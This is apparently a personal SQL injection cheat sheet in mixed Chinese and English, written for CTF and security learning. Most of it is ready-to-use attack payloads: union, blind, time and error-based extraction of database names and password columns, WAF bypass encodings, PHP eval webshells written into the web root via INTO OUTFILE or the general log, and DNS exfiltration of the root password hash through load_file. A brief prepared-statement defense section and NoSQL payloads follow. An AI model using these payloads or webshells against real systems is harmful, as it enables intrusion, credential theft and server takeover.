# SQL injection

# Basic injection  
select password from users where name = '$id';  
參數id可控?  
```sql  
5566 or 1=1 --  
5566; drop table hello  // 接著執行 drop table  

1pwnch' or 1=1 --  // select password from users where name = 'rafael' or 1=1 --';  

1pwnch' or name like '1%' --  // name欄位為1開頭的字串 為true

// 超短版本注入
'||1#     // logic op dont need space char
'^0#
'|0#
```  

# Union based
1. 存在注入?  
2. union select **欄位數目** 個資料  
```sql
// 確認欄位數目 N
// N 不斷上加, 直到頁面無法正常顯示
1' order by N#
union select 1, 1, 1,....
```  
3. 資料顯示的地方  
4. 調查身家資訊  
```sql
union select user(),database(),version(), @@version_compile_os--+
```  
5. 嘗試show出table中的資料列  
```sql
...union select 1,2,...,group_concat(schema_name) from information_schema.schemata--+  // 全部db name
```  

```sql
...union select 1,2,...,group_concat(table_name) from information_schema.tables where table_schema='FUCK'+--+  
// table_schema 也可以用hex表示
```  

```sql
...union select 1,2,...,group_concat(column_name) from information_schema.columns where table_name='users'+--+
// table_schema would be better:)...
```  

```sql
1' and 1=2 union 1,2,...,group_concat(username,password) from users+--+  
// separate
1' and 1=2 union select 1,group_concat(column_name separator '*') from table_name#    // 分割符
```  

# Blind based  
沒有動態結果顯示在頁面上，也沒有sql錯誤顯示時適用。  
🐶 **Boolean based**  
**True**: 頁面顯示正常  
**False**: 頁面顯示沒有結果或異常  
這個東西沒有定論，主要看頁面在什麼樣的情況下做什麼樣的處理來定義。  
```sql
length(str)
substr(str,pos,len)   // index從1開始
limit 0,1    // index從0開始
mid(str,pos,len)
ascii(str)    // decimal, ord()
if(a,b,c)   // 若a為true，則回傳b，否則回傳c
id=1' and ascii(substr((select database()),1,1))>65--+  // ascii from 32~127
and (mid((select group_concat(column_name) from information_schema.columns),1,1) like 'd');
```  

🐶 **Time based**  
```sql
id=1' and if(ascii(substr((select database()),1,1)>115),0,sleep(5))--+  // 若第一個字母不是s以後的字母，則延遲五秒
```  

🐶 **DNS injection**  
強制解析域名，然後從 dns log 就可以拿到想要的結果。  
MySQL:  
```php
select load_file( concat('\\\\', (select password from mysql.user where user='root' limit 1), '.www.example.com\\abc') );
```  
The limitation of the method above would be talked about in [Read file](#read-file) part.  

# Error based
* Analyze the error message  
```sql
My payload: ?id = 2'
Error: You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''2'') LIMIT 0,1' at line 1
```
When we see the word such like **near** and **at**，we can delete the single quote at the left side and right side. The left part should be: `'  2'  ') LIMIT 0,1`  
Therefore，our exploit should be: `') or 1=1--+`  
* Double injection
```sql
/**
we need:
count()            
concat()      // the primary key which is collided would be showed in error message, so we should concat our target to the primary key
floor(), rand()
group by
**/
union select count(*),1,concat((select database()),'~',floor(rand()*2))as a from information_schema.schemata group by a--+
// After we understand how it works completely, we can also modify our payload such like following:
?id = 1' or 1=1 group by concat(database(),floor(rand()*2)) having min(0)--+
```  
`floor(rand()x2)` has many same members in the list，and it causes to the collision of `group by key`! (I recommend the following article so much  
  [The recommended aticle](http://dogewatch.github.io/2017/02/27/mysql-Error-Based-Injection/)  
* Integer Overflow  
`exp()` will cause to error when the version of sql is bigger than 5.5.5  
```sql
exp(~(select*from(select user())a));  // the result of the query inside is 0, we will get 18446744073709551615 after the operation of (~), and exp(710) will cause to overflow!
// What is the a at the end? It is alias. We need to assign an alias to subquery (select*from)
```  

`select` can also return the result of the query, it will return 0 if the query is bigger than 0 and will return 1 if the result is 0 (very important!  
[The recommended article](http://vinc.top/2017/03/23/%E3%80%90sql%E6%B3%A8%E5%85%A5%E3%80%91%E6%95%B4%E5%BD%A2%E6%BA%A2%E5%87%BA%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86/)  
* xpath syntax error  
`extractvalue()`,`updatexml()` can work on the xml syntax which is provided by the user  
```sql
?id=1" or/and select updatexml(1,concat(1,(select user()),0x7e),1);
?id=1" or/and select extractvalue(1,concat(1,(select database()),0x7e));
?id=1" or/and select extractvalue(rand(),concat(0x3a,@@basedir))#
// Due to the error of xml syntax，database() will also show in the error message

and extracvalue(rand(),concat(0x3a,(select schema_name from information_schema.schemata limit 0,1))#
where table_schema=0xXXXXX

// Some trick
// If the injection point is after the word limit e.g. order by name limit {$_GET[1]}, 10
?1=select id from users where id>5 order by name limit 0,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1);
// ERROR 1105 (HY000): XPATH syntax error: ':10.1.26-MariaDB'
```  

# Some injection
🐶 **XOR injection**  
```sql
admin' ^ (ascii(mid((version())from(1)for(1))) > j) ^ '1'='1'#
// ascii(mid((version())from(1)))
```  
Useful when the character `and`, `or`, or comma is limited.  
What's interesting is that we don't need to use `for` because `ascii()` default to choose the first word.  

🐶 **Regexp injection**  
```sql
select (select pass from user where id = 1) regexp '^this_is_pass_word'
```  
It's also called the last method to make injection because there are various patterns of regular expressions.  
Useful when `=`, `in`, `like` is limited.  

🐶 **Order by injection**  
```sql
// assume the 4th column content is a948fwlglkm......
union select 1,2,3,'b',5,6,7 order by 4 (asc)
```  
We always use `order by` to get the number of table columns in union-based. However, back to the basic concept of order by, we can use it to do injection just like above. `Order by 4` means order by the 4th column in table, default setting is asc. So, our injection of `b` would become the second result, and data which is before `b` would escalate to first result.  

# WAF bypass
奇技淫巧:  
- 空白繞過 
  - `select/**/username/**/from/**/users;`  
  - `union select 1,2` -> `union(select(1),2)`  
  - aspx+mssql `%00`, php+mysql `/*%00*/`
- 大小寫混淆  
  - `SelecT`  
- 混淆  
  - `UNIunionON`  
- Inline comments(**非常實用，不一定要前面的版本號**)  
  - `id=1'/*!50000union*/+/*!50000all*/+/*!50000select*/1,2,concat_ws('/',table_name),4+from+/*!50000information_schema.tables*/+/*!50000where*/+table_schema='table'%23`  
- 逗號繞過  
  - `union select 1,2,3` -> `union select * from ((select 1)a join (select 2)b join (select 3)c);`  
  - limit `limit 1 offset 1`  
  - 一些函式如 `mid()`,`substr()`,`substring` 可以用括號 `mid((version())from(1)for(1))`  
- 編碼（或雙編碼）繞過  
  - `URL-ENCODE, HEXIDECIMAL, UNICODE`  
  - `unicode(quote): %u0027 %u02b9 %u02bc %u02c8 %u2032 %uff07 %c0%27 %c0%a7 %e0%80%a7`  
  - `unicode(space): %u0020 %uff00 %c0%20 %c0%a0 %e0%80%a0`  
  - `unicode(left bracket): %u0028 %uff08 %c0%28 %c0%a8 %e0%80%a8`  
  - `unicode(right bracket): %u0029 %uff09 %c0%29 %c0%a9 %e0%80%a9`  
  - `Char(49)` `Hex('a')` `Unhex(61)`  
  - 在 asp+iis 的環境下，伺服器常常會自動解析unicode，url中的`%`會被忽略，這也代表`s%u0065lect`能被成功解釋成'select'  
  - `IBM037`,`IBM500`,`IBM1026`,`cp875` 等等  
     [Request encoding to bypass web application firewalls](https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2017/august/request-encoding-to-bypass-web-application-firewalls/)  
     [Rare ASP.NET request validation bypass using request encoding](https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2017/september/rare-aspnet-request-validation-bypass-using-request-encoding/)  

- 注釋 
  - `#`    
  - `--+` `--` `-- -`  
  - `/* ... */` `///**/`(多行)  
  - `;` stacking queries 反而只能在PDO中運行  
- 命令繞過  
  - `sleep()` -> `benchmark()`  
- 寬字節注入  
  - 繞過單引號： `%bf%27 %df%27 %aa%27`  
- 關鍵字 `information_schema` 繞過  
  - error-based：`select * from users where name = helloworld();`  
    `ERROR 1305 (42000): FUNCTION CODINGGROUND.helloworld does not exist`  
  - `mysql.innodb_table_stats`  
  - `sys.statement_analysis`  
- HPP （asp）  
  - 當 GET/POST/COOKIE 同時提交 `uid`，伺服器會按照 GET/POST/COOKIE 的順序去接收並且用逗號將他們隔開  
  - Exploit: `http://example.com/?uid=1 and 1=2 union/*  POST: uid=*/select.....`  
- 函式分隔符  
  - 函式名和左括號間可以插入些字符，下面的例子可以拿來繞過一些禁用函式  
  - function `/**/`,`%2520`,`%250c`,`%25a0` ()  

參考與更多：  
[seebug我的wafbypass之道](https://paper.seebug.org/218/)  

# Column truncation vulnerability
This vulnerability is based on `sql_mode`, if the mode includes `STRICT_ALL_TABLES`, it would check the length of column data and **cut** it!!  

:triangular_flag_on_post: [fbctf2019 Product Manager](https://github.com/shinmao/CTF-writeups/tree/master/fbctf2019/ProductManager) Imagine that you can register one more **admin** account.

# Webshell
:racehorse: Select `into outfile` requires write-permission from users, file should **not be already exist**, and without the limitation of `secure_file_priv`.  
```sql
1' or 1 union select 1,2,"<?php @eval($_POST['hi']);?>" into outfile 'C://xampp/htdocs/sqli/Less-9/muma.php'--+ // absolute path
// into outfile must be used with double quote

// injection after limit
into outfile 'D:/1.php' lines terminiated/starting by 0x3c3f7068702070687069e666f28293b3f3e;
```  
Guess the path of document root...  
```php
// Window server IIS asp server
C:\inetpub\www\root\
// linux server nginx
/usr/local/nginx/html, /home/www/root/default, /usr/share/nginx, /var/www/html
// linux apache
/var/www/html, /var/www/html/htdocs

// guess from other results...  
// @@basedir : sql installation path
// @@datadir : database path
id=1' union select 1, @@basedir, @@datadir--+
```
e.g. With @@basedir we can get the result of ```C:/xampp/mysql```, and document root might be ```C:/xampp/htdocs/```, more content can be taken a look at [INFO-leak](https://github.com/shinmao/Web-Security-Learning/tree/master/INFO-leak) The part of absolute path.  

:racehorse: Webshell with general log  
Requirement is also **write-permission**, general log would record your history command  
Scene: Attackers are confused by **read-permission**  
```php
show variables like '%general%';
set global general_log=on;
set global general_log_file='/var/www/html/myshell.php';
```  
Open the log setting, set to the place you want your webshell, and pay attention to the default place of `general_log_file`  
```php
select '<?php @eval($_POST[1])?>';
```  
End, change `general_log_file` back to the default place, set `general_log` back to off  

# Read file  
```php
union select load_file( filename-hex );

// DNS query
select load_file(concat('\\\\',hex((select load_file('want_to_read_file'))),'example.com\\file.txt'));
```  
Attackers or users require read-permission(usually have). We can use `load_file` to read some information, for example `DB.php`. In addition to read-permission，`select into outfile`,`select into dumpfile`,`select load_file()` such functions are all limited by `secure_file_priv`, take a look at the following part...  

# SQL Privilege issue  
We always run into the SQL privilege issue when we want to write webshell or read other files. Each time attaching, server will check db_user authentication, server can also be set to **limit the attachment from external ip**. If bypass authentication，admin can also limit the command can be used by users。  
[Ref:Mysql privilege issue](https://www.cnblogs.com/Richardzhu/p/3318595.html)  
The limitation of `--secure_file_priv` on read write permission:  
mysql setting of `--secure_file_priv` limit the path of writting files, with `select @@secure_file_priv` we can get the value. Before 5.7.5, the dafault value is **Empty**, and user don't need to worry about permission. In following version, the default value is set to NULL, the tricks such as `select into` even becomes garbage because `@@secure_file_priv` is more difficult to **set** than `general_log`, `@@secure_file_priv` can't be changed when mysql is exec!  
[Ref:關於mysql中select into outfile權限的探討](https://blog.csdn.net/bnxf00000/article/details/64123549)  

# Defense
The cause of SQL injection is that **direct concat between user input and SQL syntax**!  
If we change to use `PreparedStatement`, the SQL sentence will only be compiled for **one time**, and the placeholder(`?`) will be replaced with the value of user input while running. Therefore, this is the best way to avoid SQL injection.  
However, using `PreparedStatement` doesn't mean the vulnerability of SQL injection doesn't exist. For example, if you still concat user input to SQL sentence instead of using placeholder(`?`) like following:  
```sql
// bad
string sql = "SELECT * FROM USERS WHERE NAME ='" + name + "'";
// good
string sql = "SELECT * FROM USERS WHERE NAME = ?";
```  
user input will still be compiled together with SQL sentence and cause to injection again!  
[How does a PreparedStatement avoid or prevent SQL injection?](https://stackoverflow.com/questions/1582161/how-does-a-preparedstatement-avoid-or-prevent-sql-injection/34)

# NoSQL injection
MongoDB parse the data with a format just likes json.  
Therefore, we cannot inject with string, but use `{key:value}` this kind of format to do injection.  
```sql
// The list of regex
$gt: >
$lt: <
$gte: >=
$lte: <=
$ne: not equal
$in: in
$nin: not in
$not:
$or

// expression of query
db.table_name.find({"column_name":value});      // where column = value
db.table_name.find({"column":{$reg:value}});    // where column $reg value
```  
Login first to find other hints
```sql
?username[$ne]=\&password[$ne]=\
```
Blind injection  
```sql
?username=admin&password[$regex]=^a
```  

# Reference
* [Personal article - first time meet with NoSQL](https://shinmao.github.io/2018/03/01/My-First-NoSQL/)  
* [Joy__nick 新手神器](http://www.cnblogs.com/joy-nick/p/5774462.html)  
* [CTF中几种通用的sql盲注手法和注入的一些tips](https://www.anquanke.com/post/id/160584#h2-1)  
